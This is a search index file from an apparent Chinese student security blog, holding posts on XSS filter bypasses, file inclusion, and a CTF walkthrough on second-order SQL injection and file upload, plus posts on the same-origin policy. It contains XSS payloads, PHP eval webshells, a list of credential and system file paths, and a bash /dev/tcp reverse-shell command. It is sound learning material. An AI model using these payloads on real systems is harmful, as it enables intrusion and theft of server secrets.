<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[xss跨站脚本攻击(1)]]></title>
    <url>%2F2018%2F12%2F01%2Fxss%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB-1%2F</url>
    <content type="text"><![CDATA[XSS (Reflected)用phpstudy搭了一个渗透测试环境，从xss开始吧，难度从低到高的源码low难度没有任何过滤直接 alert(‘xss’)就可以得到弹窗，medium难度加了str_replace，high难度加了preg_replace，这两个函数有什么区别呢？搜索一波， str_replace（）：定义和用法 str_replace() 函数以其他字符替换字符串中的一些字符（区分大小写）。 该函数必须遵循下列规则： 如果搜索的字符串是数组，那么它将返回数组。如果搜索的字符串是数组，那么它将对数组中的每个元素进行查找和替换。如果同时需要对数组进行查找和替换，并且需要执行替换的元素少于查找到的元素的数量，那么多余元素将用空字符串进行替换如果查找的是数组，而替换的是字符串，那么替代字符串将对所有查找到的值起作用。注释：该函数区分大小写。请使用 str_ireplace() 函数执行不区分大小写的搜索。 (1)大小写绕过&lt; sCript&gt;(2)双写绕过&lt; scr&lt; script&gt;ipt&gt;（原文：https://blog.csdn.net/caoyouming0609/article/details/75208002） preg_replace（）：. ： 匹配除“\n”之外的任何单个字符。 ： 匹配前面的子表达式零次或多次。&lt; script&gt;标签不可用，&lt; img src=”javascript:alert(‘xss’);”&gt;也不可用，我们无法依靠属性值进行跨站，但可以产生自己的事件&lt; img src=”1” onerror=alert(‘xss’)&gt; onerror是IMG标记的一个事件，只要页面发生错误，该事件立即被激活，语句中浏览器解释IMG标记时，会加载src属性引用的图片地址，该图片不存在则触发onerror事件。]]></content>
      <categories>
        <category>基础</category>
      </categories>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[文件包含漏洞]]></title>
    <url>%2F2018%2F11%2F29%2F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[文件包含漏洞（NCTF Web题‘基本操作’）又是一次毫无游戏体验的ctf，留下没技术的泪水，还是乖乖复现补题吧。 本地文件包含（恶意代码执行或者敏感信息泄露）探查路径遍历漏洞漏洞产生的原因是因为攻击者可以将路径遍历序列放入文件名内，从指定的文件目录向上回溯，从而访问服务器上的文件。路径遍历序列叫做“../” 1.包含目录文件?targent=test.txt如果里面的内容是php，则内容会被当成php执行,不是php则会读取到文件内容(用来读取/etc/passw等等配置文件的敏感信息) ?targent=./../../test.txt./当前目录,../上一级目录,这样的遍历目录来读取文件Linux：/root/.ssh/authorized_keys/root/.ssh/id_rsa/root/.ssh/id_ras.keystore/root/.ssh/known_hosts/etc/passwd/etc/shadow/etc/my.cnf/etc/httpd/conf/httpd.conf/root/.bash_history/root/.mysql_history/proc/self/fd/fd[0-9]*(文件标识符)/proc/mounts/porc/config.gz 2.包含日志文件无法上传文件的时候,可以尝试利用UA插入payload到日志文件,然后包含容器的日志文件(错误、访问文件都行),注意：选择凌晨包含最好,payload后面加一个exit()退出程序,以防大日志导致浏览器卡死,如果包含不成功,也许是open_basedir限制了目录常见几个路径：/var/log/apache/access_log/var/www/logs/access_log/var/log/access_log 3.包含session文件session中的内容可以被控制，传入恶意代码。session的存储位置可以获取。 通过phpinfo的信息可以获取到session的存储位置。 通过猜测默认的session存放位置进行尝试。session 文件一般存放在 / tmp/、/var/lib/php/session/、/var/lib/php/session / 等目录下，文件名字一般以 sess_SESSIONID 来保存本题复现登陆界面，guest弱口令进入，通过数据库查询语句在session中写入一句话木马“select &lt;?php eval($_get[‘a’]);?&gt;” 留下查询记录。burp抓包得到sessionid为 p5skdakeoussr62f91bg2oo2cv3is54i，包含session文件，一句话木马会将获取到的GET型a变量的值存入到session中。再构造index.php?target=db_sql.php%253f/../../../../../../../../tmp/sess_p5skdakeoussr62f91bg2oo2cv3is54i&amp;a=echo%20shell_exec(%22ls%20/%22) 列出当前目录所以文件看到nctfffffffff，cat就能拿到flag。php一句话木马查看php的shell信息：&lt;?php phpinfo();exit;?&gt;eval函数将接受的字符串当做代码执行：&lt;?php eval($_get[‘a’]);?&gt;&lt;?php @eval($_POST[‘c’]);?&gt;]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[黑白盒]]></title>
    <url>%2F2018%2F11%2F29%2F%E9%BB%91%E7%99%BD%E7%9B%92%2F</url>
    <content type="text"><![CDATA[黑白盒复现(补招新题)招新赛的时候没做这道题，前几天听止痒学长讲完之后觉得里面有很多知识点没有了解过，复现的时候也出现了问题，所以把完整的步骤和其中涉及的知识点整理出来吧。 首先我们可以看到界面中只有登陆和注册可以打开，可能会存在sql注入，同时在头像处可以上传文件，又可能存在文件上传漏洞。 文件上传漏洞分类1、上传文件是PHP、JSP、ASP等脚本代码，服务器的Web容器解释并执行了用户上传的脚本，导致代码执行； 2、上传文件是crossdomain.xml，导致可以控制Flash在该域下的行为(其他通过类似方式控制策略文件的情况类似); 3、上传文件是病毒、木马文件，黑客用以诱骗用户或者管理员下载执行植入到pc中。 4、上传文件是钓鱼图片或为包含了脚本的图片，在某些版本的浏览器中会被作为脚本执行，被用于钓鱼和欺诈。在大多数情况下，文件上传漏洞一般都是指“上传的Web脚本被服务器解析从而获取网站shell权限”，也就是webshell，要完成上传漏洞攻击需要满足以下几个条件: 1、上传的文件能够被Web容器解释执行，所以文件上传后所在的目录需要解析器可以执行目录下的文件，也就是说文件目录必须在web容器覆盖路径内才行。 2、用户可以直接通过浏览器进行访问这个shell文件，如果web容器不能解析这个文件，那么也不能算是漏洞。 3、最后，上传的shell文件如果被安全检查、格式化、图片压缩等功能改变了内容，则也可能导致攻击不成功。(来源：看雪) Getshell在图片上传上我们看到上传图片的地址已知，访问地址可以看到我们上传上去的图片，所以我们可以利用SQL写入一句话getshell，再反弹shell从服务器中拿到flag。 二次注入网站对我们输入的一些关键字符进行了转义，但在将数据存入到了数据库中之后，开发者就认为数据是可信的。在下一次进行需要进行查询的时候，直接从数据库中取出了该数据，没有进行进一步的检验和处理，这样就会造成SQL的二次注入。比如在第一次插入数据的时候，数据中带有单引号，直接插入到了数据库中；然后在下一次使用中在拼凑的过程中，就形成了二次注入。 在注册用户名时我们发现当我们的用户名为 1’ 时 登陆后显示的是 1\’ 所以网页对’进行了转义，但当我们在查看用户信息时我们的user_name显示为 1’ 所以说明我们的用户名已经被存储在数据库之中，并且从数据库中提取出来不会存在转义，这就造成了一个二次注入。 Into outfile导出数据到pc的指定目录下。在一开始的图片文件上传的时候我们看到存在/var/www/html/favicon/xxx可以读取和查看文件，所以我们将一句话写入这个地方/var/www/html/一般为网站的根目录 注册&lt;?php $_GET[x];?&gt;&lt;?php $_GET[x];?&gt; PHP中反引号 的作用是把反引号中的内容当做Shell命令执行，我们可以在新创建的的网页上传入变量x值来执行我们想要目标主机执行的命令，注册该用户可以将&lt;?php $_GET[x];?&gt;写入数据库 注册&lt;?php $_GET[x];?&gt;’into outfile’/var/www/html/favicon/4.php将&lt;?php $_GET[x];?&gt;从数据库中提取出来并导出到favicon/4.php此时在4.php中我们就可以通过变量x来上传我们想让目标主机执行的shell命令了 bash -c “bash -i &gt;&amp; /dev/tcp//9999 0&lt;&amp;1 2&gt;&amp;1”首先，bash -c 就是运行shell脚本 bash -i是打开一个交互的bash，/dev/tcp/是Linux中的一个特殊设备,打开这个文件就相当于发出了一个socket调用，建立一个socket连接，读写这个文件就相当于在这个socket连接中传输数据。同理，Linux中还存在/dev/udp/。要想了解“&gt;&amp;”、“0&gt;&amp;1”和2&gt;&amp;1，首先我们要先了解一下Linux文件描述符和重定向。 linux shell下常用的文件描述符是： 标准输入 (stdin) ：代码为 0 ，使用 &lt; 或 &lt;&lt; ； 标准输出 (stdout)：代码为 1 ，使用 &gt; 或 &gt;&gt; ； 标准错误输出(stderr)：代码为 2 ，使用 2&gt; 或 2&gt;&gt;。 &amp;可以理解为c语言中的取地址符（n&lt;&amp;word 是把word复制给n，n&gt;&amp;word是把word复制给n。）2&gt;&amp;1是将标准错误输出合并到标准输出中，&amp;&gt;是将标准错误输出定向到标准输出中。也就是输出标准输出的同时也会输出标准错误输出。这句话的意思创建一个可交互的bash和一个到xxx.xxx.xxx.xxx的TCP链接，然后将bash的输入输出错误都重定向到在xxx.xxx.xxx.xxx监听的进程。简单来说就是A主机可以通过执行B主机上的命令并且把返回值都返回到A上。 这里需要注意的是你的本机地址必须是公网ip，局域网ip目标主机无法识别，就无法实现反弹shell(复现的时候就在这出了问题，菜的真实….)之后再服务器开启监听 nc -lvnp 9999 现在我们之前所传的一句话就派上了用场，在4.php的地址后构造?x=bash%20-c%20%22bash%20-i%20%3E%26%20%2fdev%2ftcp//9999 0%3C%26%202%3E%261%22 就可以让目标主机执行这个命令 原理A主机开启9999端口的tcp服务B主机连接到A主机的9999的tcp服务A主机通过tcp服务把命令发到B主机B主机读取命令并且在bash中执行B主机把执行结果发给A主机 拿到shell之后就可以 cd / 进入主目录，主目录中存在包含flag的文件cat读取文件就可以拿到flag]]></content>
      <categories>
        <category>Web复现</category>
      </categories>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[同源策略]]></title>
    <url>%2F2018%2F11%2F19%2F%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5%2F</url>
    <content type="text"><![CDATA[同源策略最近在补一些基础知识，在浏览器安全最开头就看到了一个新的名词：同源策略 首先是源的概念：• 源（origin）就是协议、域名和端口号。 以下是相对于 http://www.a.com/test/index.html 的同源检测• http://www.a.com/dir/page.html —-成功• http://www.child.a.com/test/index.html —-失败，域名不同• https://www.a.com/test/index.html —-失败，协议不同所以所谓同源就是协议、域名和端口号均相同。 什么是同源策略： 同源策略是一种约定，限制了来自不同源的“document”或脚本，对当前“doucument”的读取或者设置某些属性。 举个例子：如果没有同源策略，可能a.com里的一段JS脚本在b.com未加载此脚本时也可以修改b.com的内容。 同源策略限制了不同源的对象之间的互相干扰，也就是说当JS被浏览器认为来自不同源时，请求被拒绝。注意，对于当前页面来说，页面里存放JS文件的域不重要，重要的是加载JS界面的域是什么。 什么是跨域浏览器从一个域名的网页去请求另一个域名的资源时，域名、端口、协议任一不同，都是跨域 不受同源策略限制的：1、页面中的链接，重定向以及表单提交是不会受到同源策略限制的。 2、跨域资源的引入是可以的。但是js不能读写加载的内容。如嵌入到页面中的 &lt; script src=”…” &gt; &lt; /script &gt;，&lt; img &gt;，&lt; link &gt;，&lt; iframe &gt;等。 所以我们就可以利用&lt; script &gt;标签来绕过了同源策略，来找到跨域漏洞。 第一次写博客，内容不是很全，也会有许多错误的地方，了解的知识很有限，一些名词和漏洞名称从来没有接触过，希望大家可以指出错误。]]></content>
      <categories>
        <category>基础</category>
      </categories>
      <tags>
        <tag>基础</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[博客初建]]></title>
    <url>%2F2018%2F11%2F17%2F%E9%BB%91%E7%99%BD%E7%9B%92%2Fhello-world%2F</url>
    <content type="text"><![CDATA[从零开始，希望这个博客可以和我一起进步，逐渐懂得更多。]]></content>
  </entry>
</search>
